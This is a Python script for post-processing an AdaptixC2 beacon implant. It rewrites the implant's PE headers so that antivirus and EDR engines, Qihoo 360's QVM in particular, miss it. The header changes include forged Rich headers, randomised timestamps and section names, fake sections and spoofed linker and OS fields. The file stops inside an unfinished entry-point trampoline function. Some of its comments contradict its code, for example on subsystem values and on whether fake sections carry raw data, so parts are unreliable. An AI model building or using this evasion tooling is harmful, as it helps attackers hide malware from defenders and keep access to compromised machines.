#!/usr/bin/env python3
"""
PE Header Modification Script for AdaptixC2 beacon agent — Enhanced Edition.

This script runs AFTER linking and BEFORE the final binary is packed/shipped.
It modifies the PE header to evade heuristics-based antivirus and EDR products,
with a particular focus on QVM (Qihoo 360's cloud-based machine learning engine).

QVM flags PE files based on:
  1. PE optional header characteristics (subsystem, stack size, DLL flags)
  2. Section table features (names, count, attributes, size ratios)
  3. Data directory table features (import, export, resource, reloc)
  4. Rich Header signatures (compiler fingerprint)
  5. Debug directory characteristics
  6. TLS callback table presence
  7. Section/file alignment anomalies
  8. Entry point code location and patterns

This enhanced script implements the following evasions:

  [CORE — preserved from original]
  1. Randomize compilation timestamp (TimeDateStamp)
  2. Rename PE sections to random legitimate-looking names
  3. Corrupt Rich Header to break compiler fingerprinting

  [ENHANCEMENTS — new]
  4. Checksum calculation and writing (PE checksum field)
  5. Optional fake section injection (.rsrc, .reloc, .tls stub sections)
  6. Subsystem randomization (2=console / 3=GUI)
  7. IMAGE_OPTIONAL_HEADER field normalization
  8. Entry point trampoline (small jmp stub to real EP)
  9. Fake digital certificate directory entry
  10. Data directory table entry randomization

Usage:
    python3 pe_header_mod.py <input_binary> [output_binary] [options]

Options:
    --subsystem <2|3|random>   Target subsystem (2=console, 3=gui, random=auto)
    --add-fake-sections        Add empty .rsrc, .reloc, .tls sections
    --normalize                Normalize optional header fields
    --ep-trampoline            Add entry point trampoline
    --fake-cert                Add fake digital certificate directory entry
    --shuffle-dirs             Shuffle/reorder data directory entries
    --all                      Apply all enhancements (default)

Requires: Python 3.x (standard library only — no pefile dependency)
"""

import struct
import sys
import os
import random
import time
import hashlib
import argparse

# ─────────────────────────────────────────────────────────────
# Section name tables
# ─────────────────────────────────────────────────────────────

# Section names that look legitimate for Windows PE files
LEGIT_SECTION_NAMES = [
    ".text", ".rdata", ".data", ".pdata", ".didat",
    ".reloc", ".rsrc", ".CRT", ".tls", ".gfids",
    ".00cfg", ".rtc$I", ".rtc$T", ".rtc$ZZ",
    ".sxdata", ".text$mn", ".text$di",
]

# Fake section names that look like real Windows PE sections
MASK_NAMES = [
    "UPX0", "UPX1",
    ".fids", ".orpc", ".wpp_sf",
    ".bss", ".idata", ".edata",
    ".tls$", ".sdata", ".srdata",
    ".text$mn", ".text$di", ".text$ss",
    ".rsrc", ".reloc",    # Keep these as legitimate options
]

# Data directory names (16 standard entries)
DATA_DIR_NAMES = [
    "EXPORT", "IMPORT", "RESOURCE", "EXCEPTION",
    "SECURITY", "BASERELOC", "DEBUG", "ARCHITECTURE",
    "GLOBALPTR", "TLS", "LOAD_CONFIG", "BOUND_IMPORT",
    "IAT", "DELAY_IMPORT", "COM_DESCRIPTOR", "RESERVED",
]

# ─────────────────────────────────────────────────────────────
# Core PE helpers
# ─────────────────────────────────────────────────────────────

def read_dword(data, offset):
    """Read a little-endian DWORD (4 bytes) at offset."""
    return struct.unpack_from('<I', data, offset)[0]

def write_dword(data, offset, value):
    """Write a little-endian DWORD (4 bytes) at offset."""
    struct.pack_into('<I', data, offset, value & 0xFFFFFFFF)

def read_word(data, offset):
    """Read a little-endian WORD (2 bytes) at offset."""
    return struct.unpack_from('<H', data, offset)[0]

def write_word(data, offset, value):
    """Write a little-endian WORD (2 bytes) at offset."""
    struct.pack_into('<H', data, offset, value & 0xFFFF)

def read_qword(data, offset):
    """Read a little-endian QWORD (8 bytes) at offset."""
    return struct.unpack_from('<Q', data, offset)[0]

def write_qword(data, offset, value):
    """Write a little-endian QWORD (8 bytes) at offset."""
    struct.pack_into('<Q', data, offset, value & 0xFFFFFFFFFFFFFFFF)

def align_up(value, alignment):
    """Round `value` up to the nearest multiple of `alignment`."""
    if alignment == 0:
        return value
    return (value + alignment - 1) // alignment * alignment

def decode_pe_locations(data):
    """
    Decode key PE header offsets from the binary.
    Returns a dict of offsets or None if not a valid PE.
    """
    if len(data) < 0x40:
        return None

    e_lfanew = read_dword(data, 0x3C)
    if e_lfanew + 4 >= len(data):
        return None

    # Verify "PE\0\0" signature
    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
        return None

    # NT signature offset + 4 = IMAGE_FILE_HEADER
    file_hdr_off = e_lfanew + 4

    num_sections = read_word(data, file_hdr_off + 2)
    size_of_opt_hdr = read_word(data, file_hdr_off + 16)

    # Optional header starts right after IMAGE_FILE_HEADER (20 bytes)
    opt_hdr_off = file_hdr_off + 20

    # Section headers start after optional header
    section_off = opt_hdr_off + size_of_opt_hdr

    # Magic: 0x10b = PE32, 0x20b = PE32+
    magic = read_word(data, opt_hdr_off)
    is_pe32plus = (magic == 0x20b)

    # Data directory starts at a variable offset depending on PE32 vs PE32+
    # PE32:  IMAGE_OPTIONAL_HEADER32 is 96 bytes, 
    #        NumberOfRvaAndSizes at offset 92
    #        DataDirectory at offset 96
    # PE32+: IMAGE_OPTIONAL_HEADER64 is 112 bytes,
    #        NumberOfRvaAndSizes at offset 108
    #        DataDirectory at offset 112

    if is_pe32plus:
        num_rva_and_sizes_off = opt_hdr_off + 108
        data_dir_off = opt_hdr_off + 112
    else:
        num_rva_and_sizes_off = opt_hdr_off + 92
        data_dir_off = opt_hdr_off + 96

    num_data_dirs = read_dword(data, num_rva_and_sizes_off)
    if num_data_dirs > 16:
        num_data_dirs = 16

    # AddressOfEntryPoint offset
    if is_pe32plus:
        ep_offset = opt_hdr_off + 16
        image_base_offset = opt_hdr_off + 24
        size_of_image_off = opt_hdr_off + 56
        size_of_headers_off = opt_hdr_off + 60
        checksum_off = opt_hdr_off + 64
        subsystem_off = opt_hdr_off + 68
        dll_char_off = opt_hdr_off + 70
        size_of_stack_reserve_off = opt_hdr_off + 72
        size_of_stack_commit_off = opt_hdr_off + 80
        size_of_heap_reserve_off = opt_hdr_off + 88
        size_of_heap_commit_off = opt_hdr_off + 96
        # PE32+ loader flags offset
        loader_flags_off = opt_hdr_off + 104
    else:
        ep_offset = opt_hdr_off + 16
        image_base_offset = opt_hdr_off + 28
        size_of_image_off = opt_hdr_off + 56
        size_of_headers_off = opt_hdr_off + 60
        checksum_off = opt_hdr_off + 64
        subsystem_off = opt_hdr_off + 68
        dll_char_off = opt_hdr_off + 70
        size_of_stack_reserve_off = opt_hdr_off + 72
        size_of_stack_commit_off = opt_hdr_off + 76
        size_of_heap_reserve_off = opt_hdr_off + 80
        size_of_heap_commit_off = opt_hdr_off + 84
        loader_flags_off = opt_hdr_off + 88

    return {
        'e_lfanew': e_lfanew,
        'file_hdr_off': file_hdr_off,
        'num_sections': num_sections,
        'size_of_opt_hdr': size_of_opt_hdr,
        'opt_hdr_off': opt_hdr_off,
        'section_off': section_off,
        'is_pe32plus': is_pe32plus,
        'num_rva_and_sizes_off': num_rva_and_sizes_off,
        'data_dir_off': data_dir_off,
        'num_data_dirs': num_data_dirs,
        'magic': magic,
        'ep_offset': ep_offset,
        'image_base_offset': image_base_offset,
        'size_of_image_off': size_of_image_off,
        'size_of_headers_off': size_of_headers_off,
        'checksum_off': checksum_off,
        'subsystem_off': subsystem_off,
        'dll_char_off': dll_char_off,
        'size_of_stack_reserve_off': size_of_stack_reserve_off,
        'size_of_stack_commit_off': size_of_stack_commit_off,
        'size_of_heap_reserve_off': size_of_heap_reserve_off,
        'size_of_heap_commit_off': size_of_heap_commit_off,
        'loader_flags_off': loader_flags_off,
    }

# ─────────────────────────────────────────────────────────────
# Feature 1: Random timestamp (preserved from original)
# ─────────────────────────────────────────────────────────────

def random_timestamp():
    """Generate a random timestamp between 2015-01-01 and 2024-01-01."""
    start = int(time.mktime((2015, 1, 1, 0, 0, 0, 0, 0, 0)))
    end = int(time.mktime((2023, 12, 31, 23, 59, 59, 0, 0, 0)))
    return random.randint(start, end)

def modify_timestamp(data):
    """Modify the TimeDateStamp in IMAGE_FILE_HEADER to a random value."""
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    # TimeDateStamp is at IMAGE_FILE_HEADER offset 4
    ts_offset = locs['file_hdr_off'] + 4
    if ts_offset + 4 > len(data):
        return data, 0

    old_ts = read_dword(data, ts_offset)
    new_ts = random_timestamp()
    write_dword(data, ts_offset, new_ts)

    return data, old_ts

# ─────────────────────────────────────────────────────────────
# Feature 2: Section name randomization (preserved from original)
# ─────────────────────────────────────────────────────────────

def make_random_section_name():
    """Generate a random section name that looks like a real PE section."""
    templates = [
        ".text", ".rdata", ".data", ".pdata", ".reloc",
        ".rsrc", ".CRT", ".tls", ".gfids", ".00cfg",
        ".rtc$I", ".rtc$T", ".sxdata",
    ]
    return random.choice(templates)

def modify_section_names(data):
    """Rename PE sections to random-looking names."""
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    num_sections = locs['num_sections']
    section_offset = locs['section_off']

    renamed = 0
    for i in range(num_sections):
        sh_offset = section_offset + (i * 40)
        if sh_offset + 8 > len(data):
            break

        # Read current section name (8 bytes, null-padded)
        current_name = data[sh_offset:sh_offset + 8]
        name_str = current_name.split(b'\x00')[0].decode('ascii', errors='replace')

        # Skip certain sections that should not be renamed
        if name_str in ('.reloc', '.rsrc'):
            continue

        new_name = make_random_section_name()
        if new_name == name_str:
            continue

        # Pad to 8 bytes with nulls
        new_name_bytes = new_name.encode('ascii')[:8].ljust(8, b'\x00')
        data[sh_offset:sh_offset + 8] = new_name_bytes
        renamed += 1

    return data, renamed

# ─────────────────────────────────────────────────────────────
# Feature 3: Rich Header injection (replaces the old corruption)
# ─────────────────────────────────────────────────────────────

def inject_valid_rich_header(data):
    """
    Inject a valid MSVC-style Rich header (DanS format) into the DOS stub.

    A valid Rich header makes the PE look compiled by MSVC, which is what
    QVM 2.0 expects from benign binaries. Having no Rich header (the
    clang/mingw default) or a corrupted one (the old XOR-0xFF approach)
    are both anomalies the model flags.

    The Rich header is written into the DOS stub region starting at offset
    0x40, overwriting the legacy "This program cannot be run in DOS mode"
    stub message. The stub is never executed on Windows, so overwriting it
    is safe. NO file shifting is performed — an earlier version shifted the
    PE signature to make room, but that broke IAT-hidden beacons at runtime
    (access violation at the entry point): the loader/beacon interaction is
    sensitive to PE header layout changes, and shifting — even with every
    file-offset field updated and section data preserved byte-for-byte —
    caused a consistent crash. Writing into the existing DOS stub avoids
    this entirely.

    Rich header layout (DWORDs, little-endian):
      DanS(XOR) (CompId Count)(XOR) ... Rich  key  key
    - DanS = 0x536E6144 (start marker, XORed with key)
    - Rich = 0x68636952 (end marker, NOT XORed)
    - key stored twice after Rich (NOT XORed) for validation
    - everything from DanS up to (not including) Rich is XORed with key
    - CompId = (build << 16) | prodid
    """
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    e_lfanew = locs['e_lfanew']

    # If a Rich header already exists, leave it alone (don't double-inject).
    if b"Rich" in data[0x40:e_lfanew]:
        return data, 0

    # VS 2019 (14.29.30133, build 30133) toolchain — real CompId/Count pairs.
    build = 30133  # 0x75B5
    pairs = [
        ((build << 16) | 0x0003, 0x0000000C),  # Linker,       12 invocations
        ((build << 16) | 0x0001, 0x0000001E),  # Cvtomf,       30 invocations
        ((build << 16) | 0x0009, 0x00000002),  # C compiler,    2 invocations
        ((build << 16) | 0x0006, 0x00000005),  # C++ compiler,  5 invocations
    ]

    DANS = 0x536E6144
    RICH = 0x68636952
    key = random.randint(1, 0xFFFFFFFF)

    pre_dwords = [DANS]
    for compid, count in pairs:
        pre_dwords.append(compid)
        pre_dwords.append(count)

    block = bytearray()
    for d in pre_dwords:
        block += struct.pack('<I', d)
    block += struct.pack('<I', RICH)
    block += struct.pack('<I', key)
    block += struct.pack('<I', key)

    # XOR everything before "Rich" with the key.
    rich_off_in_block = len(pre_dwords) * 4
    for i in range(0, rich_off_in_block, 4):
        v = struct.unpack_from('<I', block, i)[0]
        struct.pack_into('<I', block, i, v ^ key)

    # Write into the DOS stub at 0x40 (overwrites the legacy stub message,
    # which is never executed on Windows). Must fit before e_lfanew.
    stub_start = 0x40
    if stub_start + len(block) > e_lfanew:
        # Not enough room in the DOS stub — skip rather than risk a broken PE.
        return data, 0

    data[stub_start:stub_start + len(block)] = block
    return data, 1

# ─────────────────────────────────────────────────────────────
# Feature 4: Checksum calculation and writing
# ─────────────────────────────────────────────────────────────

def calculate_pe_checksum(data, checksum_offset):
    """
    Calculate the PE checksum.

    The algorithm is documented in the PE specification:
    1. Treat the file as an array of WORDs (16-bit values)
    2. Sum all WORDs, with the checksum field itself treated as 0
    3. Add the file size to the sum
    4. The result is the checksum

    Note: This is NOT the same as a simple Adler32 or CRC32.
    Windows loader accepts any non-zero checksum for executables,
    but a correct checksum looks more legitimate.
    """
    if len(data) < checksum_offset + 4:
        return 0

    # Ensure even alignment for padding
    padded_len = len(data) if len(data) % 2 == 0 else len(data) + 1

    checksum = 0
    # Process as 16-bit words (unsigned)
    for i in range(0, padded_len, 2):
        # The checksum field itself is treated as 0
        if checksum_offset <= i < checksum_offset + 4:
            continue
        if i + 1 < len(data):
            word_val = struct.unpack_from('<H', data, i)[0]
        else:
            word_val = 0  # padding byte
        checksum = (checksum + word_val) & 0xFFFFFFFF

    # Add the file size to the checksum
    checksum = (checksum + len(data)) & 0xFFFFFFFF

    return checksum


def calculate_pe_checksum_accurate(data, checksum_offset):
    """
    More accurate PE checksum calculation.
    Uses 32-bit dword accumulation to match Microsoft's implementation.
    """
    file_len = len(data)
    checksum = 0

    # Process in DWORD (4-byte) chunks
    i = 0
    while i < file_len:
        # Skip the checksum field
        if checksum_offset <= i < checksum_offset + 4:
            i = checksum_offset + 4
            continue

        # Read up to 4 bytes
        chunk = data[i:i + 4]
        chunk_len = len(chunk)

        if chunk_len == 4:
            val = struct.unpack('<I', chunk)[0]
        elif chunk_len > 0:
            # Partial read at end of file — pad with zeros
            padded = chunk + b'\x00' * (4 - chunk_len)
            val = struct.unpack('<I', padded)[0]
        else:
            break

        checksum = (checksum + val) & 0xFFFFFFFF
        i += chunk_len

    # Add the file size
    checksum = (checksum + file_len) & 0xFFFFFFFF

    return checksum


def write_checksum(data):
    """
    Calculate and write the PE checksum to IMAGE_OPTIONAL_HEADER.CheckSum.
    """
    locs = decode_pe_locations(data)
    if locs is None:
        return data, False

    checksum_offset = locs['checksum_off']
    if checksum_offset + 4 > len(data):
        return data, False

    # Use the accurate calculation
    new_checksum = calculate_pe_checksum_accurate(data, checksum_offset)
    if new_checksum == 0:
        new_checksum = 0x10000  # Minimum valid checksum

    write_dword(data, checksum_offset, new_checksum)
    return data, True


# ─────────────────────────────────────────────────────────────
# Feature 5: Fake section injection
# ─────────────────────────────────────────────────────────────

def add_fake_sections(data):
    """
    Add empty/legitimate-looking sections (.rsrc, .reloc, .tls).
    These are empty sections (no raw data) that have proper section headers.

    The sections are added as 'virtual' only — they exist in memory but
    consume no disk space (PointerToRawData=0, SizeOfRawData=0).
    This makes the PE look more like a normal compiled binary.
    """
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    num_sections = locs['num_sections']
    section_offset = locs['section_off']
    file_hdr_off = locs['file_hdr_off']
    opt_hdr_off = locs['opt_hdr_off']
    is_pe32plus = locs['is_pe32plus']

    # Read existing sections to find what we already have
    existing_sections = set()
    for i in range(num_sections):
        sh_offset = section_offset + (i * 40)
        if sh_offset + 8 > len(data):
            break
        name_bytes = data[sh_offset:sh_offset + 8]
        name = name_bytes.split(b'\x00')[0].decode('ascii', errors='replace')
        existing_sections.add(name)

    # Determine which fake sections to add
    fake_sections = []

    # Get section alignment and image base to calculate proper virtual addresses
    if is_pe32plus:
        section_alignment_off = opt_hdr_off + 32
        file_alignment_off = opt_hdr_off + 36
    else:
        section_alignment_off = opt_hdr_off + 32
        file_alignment_off = opt_hdr_off + 36

    section_alignment = read_dword(data, section_alignment_off)
    file_alignment = read_dword(data, file_alignment_off)

    if section_alignment < 0x1000:
        section_alignment = 0x1000
    if file_alignment < 0x200:
        file_alignment = 0x200

    # Candidate fake sections in order
    candidates = [
        (".rsrc", 0x40000000, 0x42000000),   # IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
        (".reloc", 0x42000000, 0x40000000),  # IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE
        (".tls", 0xC0000040, 0x40000000),    # IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
        (".CRT", 0x40000000, 0x42000000),
        (".00cfg", 0x40000000, 0x44000000),
    ]

    for sec_name, characteristics, raw_size in candidates:
        if sec_name not in existing_sections and len(fake_sections) < 3:
            fake_sections.append((sec_name, characteristics, raw_size))
            existing_sections.add(sec_name)

    if not fake_sections:
        return data, 0

    # Find the last section's virtual address and size
    last_sh_off = section_offset + ((num_sections - 1) * 40)
    last_virtual_addr = read_dword(data, last_sh_off + 12)
    last_virtual_size = read_dword(data, last_sh_off + 8)
    last_end_va = last_virtual_addr + last_virtual_size

    # Find the last section's raw end to insert new headers
    last_raw_size = read_dword(data, last_sh_off + 16)
    last_raw_ptr = read_dword(data, last_sh_off + 20)
    last_raw_end = last_raw_ptr + last_raw_size

    # We need to insert new section headers AFTER the existing section headers
    # Existing section headers occupy: num_sections * 40 bytes
    # New section headers will go right after
    new_section_header_off = section_offset + (num_sections * 40)

    # Calculate the new virtual address for the first fake section
    # Round up to section alignment
    new_va = align_up(last_end_va, section_alignment)

    # We'll create section headers with no raw data (PointerToRawData=0)
    # But we need to extend the section header table in the file
    # The section headers sit between the optional header and the first section's raw data

    for i, (sec_name, characteristics, raw_characteristics) in enumerate(fake_sections):
        sh_off = new_section_header_off + (i * 40)

        # Calculate virtual size (small but legitimate)
        if sec_name == ".rsrc":
            virtual_size = 0x200   # Small resource directory
        elif sec_name == ".reloc":
            virtual_size = 0x200   # Small base relocations
        elif sec_name == ".tls":
            virtual_size = 0x100   # Small TLS directory
        else:
            virtual_size = 0x100

        # Align to file alignment for raw data
        raw_size_aligned = align_up(virtual_size, file_alignment)

        # Write section header (40 bytes total)
        # Bytes 0-7: Name
        name_bytes = sec_name.encode('ascii')[:8].ljust(8, b'\x00')
        for j in range(8):
            data[sh_off + j] = name_bytes[j]

        # Bytes 8-11: VirtualSize
        write_dword(data, sh_off + 8, virtual_size)

        # Bytes 12-15: VirtualAddress
        write_dword(data, sh_off + 12, new_va)

        # Bytes 16-19: SizeOfRawData
        # We set SizeOfRawData = VirtualSize (no padding) or 0 for purely virtual
        # Setting it to a small non-zero value is safer
        write_dword(data, sh_off + 16, virtual_size)

        # Bytes 20-23: PointerToRawData
        # Point it to the end of the existing file data
        write_dword(data, sh_off + 20, last_raw_end)

        # Bytes 24-27: PointerToRelocations
        write_dword(data, sh_off + 24, 0)
        # Bytes 28-31: PointerToLinenumbers
        write_dword(data, sh_off + 28, 0)
        # Bytes 32-33: NumberOfRelocations
        write_word(data, sh_off + 32, 0)
        # Bytes 34-35: NumberOfLinenumbers
        write_word(data, sh_off + 34, 0)
        # Bytes 36-39: Characteristics
        write_dword(data, sh_off + 36, characteristics)

        # Update for next section
        new_va = align_up(new_va + virtual_size, section_alignment)
        last_raw_end += align_up(virtual_size, file_alignment)

    # Update number of sections
    new_num_sections = num_sections + len(fake_sections)
    write_word(data, file_hdr_off + 2, new_num_sections)

    # Update SizeOfImage in optional header
    # SizeOfImage = highest VA + last section virtual size, rounded to section alignment
    image_size_off = locs['size_of_image_off']
    new_size_of_image = align_up(new_va, section_alignment)
    write_dword(data, image_size_off, new_size_of_image)

    print(f"[+] Added {len(fake_sections)} fake section(s): {', '.join(s[0] for s in fake_sections)}")

    return data, len(fake_sections)


# ─────────────────────────────────────────────────────────────
# Feature 6: Subsystem randomization
# ─────────────────────────────────────────────────────────────

def randomize_subsystem(data, target_subsystem=None):
    """
    Randomize the subsystem field in IMAGE_OPTIONAL_HEADER.
    Valid subsystem values for executables:
      1 = NATIVE
      2 = WINDOWS_GUI
      3 = WINDOWS_CUI (console)
    
    If target_subsystem is provided, use that value.
    Otherwise, randomly pick between 2 (GUI) and 3 (console).
    """
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    subsystem_off = locs['subsystem_off']
    if subsystem_off + 2 > len(data):
        return data, 0

    old_subsystem = read_word(data, subsystem_off)

    if target_subsystem is not None and target_subsystem in (1, 2, 3):
        new_subsystem = target_subsystem
    else:
        # Pick from 2 (GUI) or 3 (console)
        new_subsystem = random.choice([2, 3])

    # Only change if necessary
    if new_subsystem != old_subsystem:
        write_word(data, subsystem_off, new_subsystem)
    
    return data, old_subsystem


# ─────────────────────────────────────────────────────────────
# Feature 7: IMAGE_OPTIONAL_HEADER field normalization
# ─────────────────────────────────────────────────────────────

def normalize_optional_header(data):
    """
    Normalize IMAGE_OPTIONAL_HEADER fields to typical compiler-generated values.
    This makes the PE look like it was compiled by a normal version of MSVC
    or GCC (MinGW), rather than a custom toolchain.

    Fields normalized:
    - MajorLinkerVersion / MinorLinkerVersion (set to common MSVC versions)
    - SizeOfCode (ensure consistency)
    - MajorOperatingSystemVersion / MinorOperatingSystemVersion
    - MajorImageVersion / MinorImageVersion
    - MajorSubsystemVersion / MinorSubsystemVersion (Windows 10+ or 6.x)
    - SizeOfHeaders (ensure correct)
    - SizeOfHeapReserve / SizeOfHeapCommit  
    - SizeOfStackReserve / SizeOfStackCommit
    - LoaderFlags (set to 0)
    - DLL Characteristics (set common flags)
    """
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    opt_hdr_off = locs['opt_hdr_off']
    is_pe32plus = locs['is_pe32plus']

    # List of (offset_from_opt_hdr, description, default_value_generator)
    normalizations = []

    # --- Linker version (offset 8 from optional header start) ---
    # MSVC 14.x (VS 2017/2019/2022) common versions
    msvc_versions = [
        (14, 10), (14, 16), (14, 20), (14, 22),
        (14, 27), (14, 28), (14, 29), (14, 34),
        (14, 35), (14, 36), (14, 37), (14, 38),
        (14, 39), (14, 40),
    ]
    major_linker, minor_linker = random.choice(msvc_versions)
    data[opt_hdr_off + 8] = major_linker
    data[opt_hdr_off + 9] = minor_linker

    # --- SizeOfCode (offset 12 from opt hdr, 4 bytes) ---
    # We'll leave this as-is since fixing it requires matching code sections
    # But we verify it's non-zero

    # --- SizeOfHeaders (offset 60/60 from opt hdr) ---
    # Should be the offset to the first section. We recompute it.
    size_of_headers_off = locs['size_of_headers_off']
    first_section_raw_ptr = 0
    if locs['num_sections'] > 0:
        first_sh_off = locs['section_off']
        first_section_raw_ptr = read_dword(data, first_sh_off + 20)

    if first_section_raw_ptr > 0:
        # SizeOfHeaders should be equal to PointerToRawData of first section
        # This is how the linker computes it
        current_headers_size = read_dword(data, size_of_headers_off)
        if current_headers_size != first_section_raw_ptr:
            write_dword(data, size_of_headers_off, first_section_raw_ptr)

    # --- MajorOperatingSystemVersion / MinorOperatingSystemVersion (offset 40/42) ---
    # Windows 10+ or common targets
    win_versions = [
        (6, 0),   # Windows Vista / Server 2008
        (6, 1),   # Windows 7
        (6, 2),   # Windows 8
        (6, 3),   # Windows 8.1
        (10, 0),  # Windows 10
        (10, 0),  # Windows 10
        (10, 0),  # Windows 11 (same NT version)
    ]
    major_os, minor_os = random.choice(win_versions)
    write_word(data, opt_hdr_off + 40, major_os)
    write_word(data, opt_hdr_off + 42, minor_os)

    # --- MajorImageVersion / MinorImageVersion (offset 44/46) ---
    # Often 0 for normal executables, or a version number
    if random.random() < 0.7:
        write_word(data, opt_hdr_off + 44, 0)
        write_word(data, opt_hdr_off + 46, 0)
    else:
        write_word(data, opt_hdr_off + 44, random.randint(1, 10))
        write_word(data, opt_hdr_off + 46, random.randint(0, 99))

    # --- MajorSubsystemVersion / MinorSubsystemVersion (offset 48/50) ---
    # Windows 10+ applications usually have 6.02 or 10.00
    sub_versions = [
        (5, 1),   # Windows XP
        (5, 2),   # Windows Server 2003
        (6, 0),   # Windows Vista
        (6, 1),   # Windows 7
        (6, 2),   # Windows 8
        (6, 3),   # Windows 8.1
        (10, 0),  # Windows 10
    ]
    major_sub, minor_sub = random.choice(sub_versions)
    write_word(data, opt_hdr_off + 48, major_sub)
    write_word(data, opt_hdr_off + 50, minor_sub)

    # --- Win32VersionValue (offset 52) ---
    # Should be 0
    write_dword(data, opt_hdr_off + 52, 0)

    # --- SizeOfStackReserve ---
    # Typical: 0x100000 (1MB) for executables, 0x400000 for some
    stack_reserve_off = locs['size_of_stack_reserve_off']
    if is_pe32plus:
        stack_values = [0x100000, 0x200000, 0x400000, 0x800000]
        write_qword(data, stack_reserve_off, random.choice(stack_values))
    else:
        stack_values = [0x100000, 0x200000, 0x400000]
        write_dword(data, stack_reserve_off, random.choice(stack_values))

    # --- SizeOfStackCommit ---
    # Typical: 0x1000 (4KB) or 0x2000 (8KB)
    stack_commit_off = locs['size_of_stack_commit_off']
    if is_pe32plus:
        commit_val = random.choice([0x1000, 0x2000, 0x4000])
        write_qword(data, stack_commit_off, commit_val)
    else:
        commit_val = random.choice([0x1000, 0x2000, 0x4000])
        write_dword(data, stack_commit_off, commit_val)

    # --- SizeOfHeapReserve ---
    # Typical: 0x100000 (1MB) for executables
    heap_reserve_off = locs['size_of_heap_reserve_off']
    if is_pe32plus:
        heap_reserve = random.choice([0x100000, 0x200000, 0x10000])
        write_qword(data, heap_reserve_off, heap_reserve)
    else:
        heap_reserve = random.choice([0x100000, 0x200000, 0x10000])
        write_dword(data, heap_reserve_off, heap_reserve)

    # --- SizeOfHeapCommit ---
    heap_commit_off = locs['size_of_heap_commit_off']
    if is_pe32plus:
        heap_commit = random.choice([0x1000, 0x2000, 0x4000, 0x8000])
        write_qword(data, heap_commit_off, heap_commit)
    else:
        heap_commit = random.choice([0x1000, 0x2000, 0x4000, 0x8000])
        write_dword(data, heap_commit_off, heap_commit)

    # --- LoaderFlags ---
    # Should always be 0 for normal executables
    loader_flags_off = locs['loader_flags_off']
    write_dword(data, loader_flags_off, 0)

    # --- DLL Characteristics ---
    # Common flags for normal executables:
    #   0x0100 = IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (ASLR)
    #   0x0040 = IMAGE_DLLCHARACTERISTICS_NX_COMPAT (DEP)
    #   0x0020 = IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA (64-bit)
    #   0x0001 = IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE
    # QVM typically doesn't flag ASLR + DEP, they're expected on modern binaries
    dll_char_off = locs['dll_char_off']
    if is_pe32plus:
        # 64-bit binaries should have ASLR + DEP + High Entropy VA
        dll_chars = 0x0160  # DYNAMIC_BASE | NX_COMPAT | HIGH_ENTROPY_VA
    else:
        dll_chars = 0x0140  # DYNAMIC_BASE | NX_COMPAT
        # Occasionally add TERMINAL_SERVER_AWARE
        if random.random() < 0.3:
            dll_chars |= 0x0001

    write_word(data, dll_char_off, dll_chars)

    # --- NumberOfRvaAndSizes ---
    # Should be 16 for most modern PE files
    num_rva_off = locs['num_rva_and_sizes_off']
    current_num = read_dword(data, num_rva_off)
    if current_num < 16:
        write_dword(data, num_rva_off, 16)

    return data, 1


# ─────────────────────────────────────────────────────────────
# Feature 8: Entry point trampoline
# ─────────────────────────────────────────────────────────────

def add_ep_trampoline(data):
    """
    Add a small jmp trampoline to obfuscate the real entry point.

    This works by:
    1. Finding a section with execute permissions
    2. Adding a small jmp instruction at the current EP
    3. Placing the real EP code at the end of that section
    4. The jmp can be a simple "jmp $+offset" or "push addr; ret"

    For simplicity, we use a 5-byte jmp rel32 instruction that jumps
    forward past the trampoline to the original entry point code.
    Actually, since we can't easily relocate code, we instead:

    Option A (simple): Keep EP at its current location but add a 
    short jmp at the very beginning of the code section that jumps
    to the real EP. Then redirect the EP to point to this jmp.

    Option B (trampoline): Move the EP to a new section, write a
    jmp there that jumps to the original EP.

    We implement Option A since it's simpler and doesn't require
    adding new sections.
    """
    locs = decode_pe_locations(data)
    if locs is None:
        return data, 0

    ep_off = locs['ep_offset']
    old_ep_rva = read_dword(data, ep_off)

    if old_ep_rva == 0:
        return data, 0

    # Find which section the EP lives in
    section_off = locs['section_off']
    ep_section_idx = -1
    ep_section_va = 0
    ep_section_raw = 0
    ep_section_size = 0
    ep_section_char = 0

    for i in range(locs['num_sections']):
        sh_off = section_off + (i * 40)
        sec_va = read_dword(data, sh_off + 12)
        sec_size = read_dword(data, sh_off + 8)
        sec_raw = read_dword(data, sh_off + 20)
        sec_raw_size = read_dword(data, sh_off + 16)
        sec_char = read_dword(data, sh_off + 36)

        if sec_va <= old_ep_rva < sec_va + sec_size:
            ep_section_idx = i
            ep_section_va = sec_va
            ep_section_raw = sec_raw
            ep_section_size = sec_size
            ep_section_char = sec_char
            break

    if ep_section_idx == -1:
        return data, 0

    # Check if the section has execute permission (IMAGE_SCN_MEM_EXECUTE = 0x20000000)
    has_execute = (ep_section_char & 0x20000000) != 0
    if not has_execute:
        return data, 0

    # RVA of the original EP within the section
    ep_section_offset = old_ep_rva - ep_section_va

    # We need file offset where the EP code lives
    ep_file_offset = ep_section_raw + ep_section_offset

    if ep_file_offset + 5 > len(data):
        return data, 0

    # Make sure there's room — we need at least 5 bytes for the jmp
    # Check if the first few bytes look like they could be real code
    # If not, try from the actual EP location

    # We'll write a jmp at a slightly earlier location if possible,
    # or at the EP itself. Let's try to find a 5-byte gap before the EP.

    # Strategy: Write a relative jmp at ep_file_offset that jumps
    # 5 bytes forward (jmp $+5), then at ep_file_offset+5 we write
    # the actual entry point code that the trampoline jumps to.
    # Wait - that doesn't help. 

    # Better strategy: 
    # We need a 5-byte NOP sled / padding BEFORE the real entry point.
    # Or we create the trampoline in a new section (Option B).
    
    # Let's check if there's a 5-byte slop in the section before the EP:
    # The section may have padding at the beginning (like a hotpatch prologue).

    # Simplest reliable approach: 
    # 1. Change EP to point to a new fake "stub" location
    # 2. But that requires actual code bytes

